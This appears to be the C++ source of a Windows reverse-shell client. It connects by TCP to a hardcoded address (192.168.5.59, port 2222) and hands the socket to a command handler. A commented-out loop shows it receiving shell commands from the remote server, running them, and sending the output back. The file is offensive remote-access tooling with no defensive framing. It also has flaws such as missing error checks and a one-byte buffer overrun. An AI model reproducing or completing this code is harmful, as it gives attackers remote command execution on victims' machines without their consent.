#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include "main.h"


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define BUFFERSIZE 512
using namespace std;

void ClearWinSock() {
	WSACleanup();
}

int main() {
	WSADATA wsaData;
	SOCKET socketC = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	Command command;

	// Initialize Winsock
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	getaddrinfo("192.168.5.59", "2222", &hints, &result);

	// Create a SOCKET for connecting to server
	socketC = socket(result->ai_family, result->ai_socktype, result->ai_protocol);

	// Connect to server.
	connect(socketC, result->ai_addr, (int)result->ai_addrlen);

	OperateSocket operateSocket(socketC);
	operateSocket.operate();
	//freeaddrinfo(result);
	/*while (true) {
		char* runcd = command.run_command("cd 2>&1");

		int lencd = strlen(runcd);
		send(socketC, (char*)&lencd, sizeof(int), 0);
		send(socketC, runcd, lencd, 0);
		//Received from server
		printf("Received: \n");
		char* res = NULL;

		char sizeBuff[5];
		memset(sizeBuff, '\0', sizeof(sizeBuff));

		int k = 0;
		while (k < 4) {
			int nbytes = recv(socketC, &sizeBuff[k], 1, 0);
			k++;
		};

		int* myints = (int*)sizeBuff;
		printf("myint=%d\n",ntohl(*myints));
		int sizePkt = ntohl(*myints);
		if (sizePkt <= 0) {
			continue;
		}
		char *buf = new char[sizePkt];
		int count = 0;
		while (count < sizePkt) {
			recv(socketC, &buf[count], 1, 0);
			count++;
		}
		buf[count] = '\0';
		printf("buf: %s\n", buf);
		//do stuff
		res = command.run_command(buf);
		cout << "res:" << res << endl;

		//send to the server
		int stringLen = strlen(res);
		send(socketC, (char*)&stringLen, sizeof(int), 0);
		send(socketC, res, stringLen, 0);
	}*/

	// Closing connection
	closesocket(socketC);
	ClearWinSock();
	printf("\n");
	system("pause");
	return (0);
}